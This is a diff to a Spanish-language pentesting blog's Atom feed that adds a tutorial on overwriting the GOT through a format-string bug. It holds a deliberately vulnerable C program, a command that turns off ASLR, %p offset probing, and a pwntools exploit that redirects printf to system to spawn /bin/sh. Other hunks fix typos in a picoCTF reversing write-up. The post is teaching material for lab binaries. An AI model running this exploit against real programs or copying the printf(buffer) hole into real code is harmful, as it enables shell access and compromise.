@@ -1,4 +1,182 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-29T17:39:38-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">Format string</title><link href="http://localhost:4000/format-string/" rel="alternate" type="text/html" title="Format string" /><published>2022-07-29T00:00:00-05:00</published><updated>2022-07-29T00:00:00-05:00</updated><id>http://localhost:4000/format-string</id><content type="html" xml:base="http://localhost:4000/format-string/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-30T14:45:41-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">GOT overwrite con Format String</title><link href="http://localhost:4000/got-overwrite/" rel="alternate" type="text/html" title="GOT overwrite con Format String" /><published>2022-07-30T00:00:00-05:00</published><updated>2022-07-30T00:00:00-05:00</updated><id>http://localhost:4000/got-overwrite</id><content type="html" xml:base="http://localhost:4000/got-overwrite/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Global Offset Table (GOT) y Procedure Linked Table (PLT)&lt;/li&gt;
+  &lt;li&gt;Analisis del binario&lt;/li&gt;
+  &lt;li&gt;Calculando el offset del buffer y la direccion de libc&lt;/li&gt;
+  &lt;li&gt;Armando nuestro exploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;got-y-plt&quot;&gt;GOT y PLT&lt;/h2&gt;
+
+&lt;p&gt;Para entender esto mejor veremos la estructura de un binario ELF.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/formatString-got/elf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora pondre otra estructura donde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;section header table&lt;/code&gt; apunta a la seccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.radata&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.data&lt;/code&gt; del binario, si se dan cuenta la estructura de arriba es mas extensa que la de abajo, esto es por que un archivo ELF tiene dos vistas, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Program header table&lt;/code&gt; donde muestra los segmentos utilizados en tiempo de ejecución, y la otra es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;section header table&lt;/code&gt; que enumera el conjunto de secciones, simplemente en la imagen de arriba no se muesta explicitamente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;section header table&lt;/code&gt;, pero ambas estructuras son correctas&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|----------------------|
+|      ELF header      |
+|----------------------|
+| Program header table |
+|----------------------|
+|        .text         | &amp;lt;--|
+|----------------------|    |
+|        .rodata       | &amp;lt;--|
+|----------------------|    |
+|        .data         | &amp;lt;--|
+|----------------------|    |
+| section header table | ---|
+|----------------------|
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;direcciones-de-los-simbolos&quot;&gt;Direcciones de los simbolos&lt;/h3&gt;
+
+&lt;p&gt;En un binario ELF una seccion de texto necesita saber la direccion virtual absoluta de un simbolo (como por ejemplo una funcion o variable), esto surge de una operacion donde se toma una direccion o una entrada a PLT, por ejemplo una direccion puede ser esto:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Una constante de tiempo de enlace&lt;/li&gt;
+  &lt;li&gt;La base de carga más una constante de tiempo de enlace.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si se dieron cuenta se menciona la palabra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enlace&lt;/code&gt; y esto es por que GOT y PLT se encargan de la gran parte del enlazado dinamico&lt;/p&gt;
+
+&lt;p&gt;Imaginemos una situacion donde tomanos el valor de un simbolo, para poder realizar esto tenemos que hacer que el enlazador dinamico busque la direccion en memoria de ese simbolo y reescriba el codigo para solo poder carga una sola direccion, esto es demasiado proceso e incluso aumenta el tamaño del binario, asi que una mejora mucho mas eficiente y eficaz es reservar un espacio en la memoria del binario en la cual se mantendra la direccion de ese simbolo y posteriormente hacer que el enlazador dinamico ponga la direccion alli en lugar de reescribir todo el codigo, esto es gracias a que existe GOT, y GOT se encuenta en una seccion el binario que se llama .got, se puede ver en la primera imagen.&lt;/p&gt;
+
+&lt;h3 id=&quot;como-trabaja-got-y-plt&quot;&gt;¿Como trabaja GOT y PLT?&lt;/h3&gt;
+
+&lt;p&gt;GOT trabaja de la siguiente manera, primero GOT se abre como un enlazador dinamico durante la ejecion del binario, posteriormente obtiene las direcciones absolutas de las funciones solicitadas y GOT se actualiza asi mismo segun lo que fue solicitado, despues toma las solicitudes de las ubicaciones que vienen por parte de PLT, una vez que esto se concluya tenemos el paso final en el cual PLT esta vinculado con la direccion de GOT, entonces ahora el binario puede llamar directamente a esa funcion que fue solicitada desde las librerias. Definitavemente GOT y PLT son los mejores amigos&lt;/p&gt;
+
+&lt;h3 id=&quot;un-pequeño-ejemplo&quot;&gt;Un pequeño ejemplo&lt;/h3&gt;
+
+&lt;p&gt;El codigo del ejemplo es el siguiente, compilenlo como quieran, ese no es el que se va a explotar, simplemente solo es para ver como se representaria GOT y PLT en debugger&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo que hace este pequeño programa es obtener nuestro input y meterlo en el buffer de 8 bytes usando la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; para posteriormente imprimirlo con la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;, pasaremos a meter el binario a gdb y a mostrar el main&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/formatString-got/got%26plt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos visualizar algo como esto, donde se ve que tenemos dos entradas de PLT y ahora nuestas funciones de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; pasaron a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets@plt&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts@plt&lt;/code&gt; y esto es por que no se sabe con exactitud donde esta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;por lo que salta a PLT&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;A tomar en cuenta:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;En caso de que haya una entrada para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;, ambas funcioes saltaran a la direccion que esta almecenada all&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;*Las direcciones en memoria de las funciones de libc, como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; estan almacenadas en GOT&lt;/p&gt;
+
+&lt;h3 id=&quot;como-nos-podemos-aprovechar-de-esto&quot;&gt;¿Como nos podemos aprovechar de esto?&lt;/h3&gt;
+
+&lt;p&gt;Si tenemos una entrada PLT que sea de una funcion de libc, podemos redirigir la entrada PLT hacia otra parte&lt;/p&gt;
+
+&lt;h3 id=&quot;got-overwrite&quot;&gt;GOT overwrite&lt;/h3&gt;
+
+&lt;p&gt;Esta tecnica consiste en sobreecribir la direccion de GOT de una funcion por una direccion que nosotros queramos, por ejemplo en nuestro binario que vamos a explotar nos vamos a aprovechar de la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt;, entonces si sobreescribe la direccion GOT de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; por cualquier otra lo que va a pasar es que PLT va a adquirir la direccion GOT que sobreescribimos y ejecuta a lo que hayamos indicado.&lt;/p&gt;
+
+&lt;h2 id=&quot;analisis-del-binario&quot;&gt;Analisis del binario&lt;/h2&gt;
+
+&lt;p&gt;Primeramente desactivamos el ASRL con:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;El binario usado lo saque de: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://ir0nstone.gitbook.io/notes/&lt;/code&gt;, todo el credito para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Andrej (aka ir0nstone)&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Lo que haces el binario es mantenerse en un bucle infinito recibiendo nuestros inputs con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; y mostrandolos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; asi que no podemos hacer BoF, si vemos las protecciones del binario lo unico que tenemos activado es PIE pero realmente no nos interesa si esta activado o no.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;calculando-el-offset-del-buffer-y-la-direccion-de-libc&quot;&gt;Calculando el offset del buffer y la direccion de libc&lt;/h2&gt;
+
+&lt;h3 id=&quot;direccion-de-libc&quot;&gt;Direccion de libc&lt;/h3&gt;
+
+&lt;p&gt;Para esto solamente usaremos el comando ldd, y queda asi &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd got_overwrite-32&lt;/code&gt;, nos motrara algo como esto&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	linux-gate.so.1 (0xf7fc3000)
+	libc.so.6 =&amp;gt; /usr/lib32/libc.so.6 (0xf7c00000)
+	/lib/ld-linux.so.2 =&amp;gt; /usr/lib/ld-linux.so.2 (0xf7fc5000)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Donde la direccion de libc es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xf7c00000&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;calculando-el-offset-del-buffer&quot;&gt;Calculando el offset del buffer&lt;/h3&gt;
+
+&lt;p&gt;Viendo que se esta imprimiendo la variable buffer de esta forma &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(buffer)&lt;/code&gt; podemos hace uso de format string, de hecho si le pasamos unos cuantos format string lo que hara es buscar valores de la memoria e imprimirlos como vemos en la imagen&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/formatString-got/format1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para saber el offset el buffer tenemos que pasarle algunas A en conjunto de unos format string, de esta manera &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAAAAAA %p %p %p %p %p %p %p&lt;/code&gt; esto con el fin de ver desde donde se estan inprimiendo nuestras A, esto nos imprime lo siguiente&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/formatString-got/format2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entonces si empezamos a contar desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x12c&lt;/code&gt; hasta donde tengo seleccionado en la imagen, nos da 5, entonces el offset del buffer es 5.&lt;/p&gt;
+
+&lt;h2 id=&quot;armando-nuestro-exploit&quot;&gt;Armando nuestro exploit&lt;/h2&gt;
+
+&lt;p&gt;El exploit queda de la siguiente manera&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./got_overwrite-32'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7c00000&lt;/span&gt;   
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./got_overwrite-32&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmtstr_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'printf'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]})&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/bin/sh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Si vemos en esta parte&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El numero 5 es el offset del buffer, lo que estamos haciendo aqui &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;elf.got['printf']&lt;/code&gt; es sacar la direccion GOT de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; y sustuirla por la de system, y mas abajo se llama de esta manera &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p.sendline('/bin/sh')&lt;/code&gt; ya que es lo que queremos ejecutar&lt;/p&gt;
+
+&lt;p&gt;Y ahora si ejecutamos el exploit debimos de obtener una shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/formatString-got/format4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/formatString-got/waifu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="got-plt" /><category term="gdb" /><category term="formatStr" /><summary type="html">En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string</summary></entry><entry><title type="html">Format string</title><link href="http://localhost:4000/format-string/" rel="alternate" type="text/html" title="Format string" /><published>2022-07-29T00:00:00-05:00</published><updated>2022-07-29T00:00:00-05:00</updated><id>http://localhost:4000/format-string</id><content type="html" xml:base="http://localhost:4000/format-string/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;¿Que es format string?&lt;/li&gt;
   &lt;li&gt;Calling conventions&lt;/li&gt;
@@ -172,11 +350,11 @@
 
 &lt;h2 id=&quot;debugging-al-binario-con-radare2&quot;&gt;Debugging al binario con radare2.&lt;/h2&gt;
 
-&lt;p&gt;Para comenzar con el debugging ingresamos el siguiente comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radare2 ./svchost.exe&lt;/code&gt;, posterior mente analizamos el binario con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa&lt;/code&gt;, nos movemos el main con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s main&lt;/code&gt; y por ultimo mostramos el main con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdf&lt;/code&gt; y nos muestra todo esto&lt;/p&gt;
+&lt;p&gt;Para comenzar con el debugging ingresamos el siguiente comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radare2 ./svchost.exe&lt;/code&gt;, posteriormente analizamos el binario con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa&lt;/code&gt;, nos movemos el main con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s main&lt;/code&gt; y por ultimo mostramos el main con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdf&lt;/code&gt; y nos muestra todo esto&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/picoCTF-hurry/radare1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;La primera cosa interasantes la vemos en esta linea:&lt;/p&gt;
+&lt;p&gt;La primera cosa interasante la vemos en esta linea:&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lea rax, str._ada_main      ; 0x2ad8 ; &quot;_ada_main&quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;La cual vemos una funcion con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_ada_main&lt;/code&gt;, asi que haciendo una busqueda rapida en google por el nombre de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ada&lt;/code&gt;, me mostro que es un lenguaje de programacion, asi que el binario esta escrito en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ada&lt;/code&gt;, seguimos viendo el codigo y llegamos a esta parte:&lt;/p&gt;
@@ -244,7 +422,7 @@ mov rsi, rax
 
 &lt;p&gt;Y esto lo que esa haciendo es tomar el primer caracter de la cadena &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pqrstuvwxyzCTF_{}&lt;/code&gt; y meterlo en la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sym.imp.ada__text_io__put__4&lt;/code&gt; que se llama en la parte de abajo.&lt;/p&gt;
 
-&lt;p&gt;Esto es curioso ya que esa ese caracter que mete pertenece a la flag. Pasaremos a anlizar la siguiente funcion que es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fcn.000024aa&lt;/code&gt; de igual manera mostramos su contenido&lt;/p&gt;
+&lt;p&gt;Esto es curioso ya que esa ese caracter que mete pertenece a la flag. Pasaremos a analizar la siguiente funcion que es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fcn.000024aa&lt;/code&gt; de igual manera mostramos su contenido&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/picoCTF-hurry/radare8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -290,7 +468,7 @@ Asi que para no hacer esto mas largo, al final la flag que me salio a mi es esta
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/picoCTF-hurry/waifu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;font size=&quot;1&quot;&gt; ijaesuperramadre Kamiya esta bien guapa&lt;/font&gt;</content><author><name>c4rta</name></author><category term="Reversing" /><category term="radare2" /><summary type="html">Resolveremos un pequeño ejercicio de reversing de picoCTF</summary></entry><entry><title type="html">ret2libc bypass NX</title><link href="http://localhost:4000/ret2libc/" rel="alternate" type="text/html" title="ret2libc bypass NX" /><published>2022-07-29T00:00:00-05:00</published><updated>2022-07-29T00:00:00-05:00</updated><id>http://localhost:4000/ret2libc</id><content type="html" xml:base="http://localhost:4000/ret2libc/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
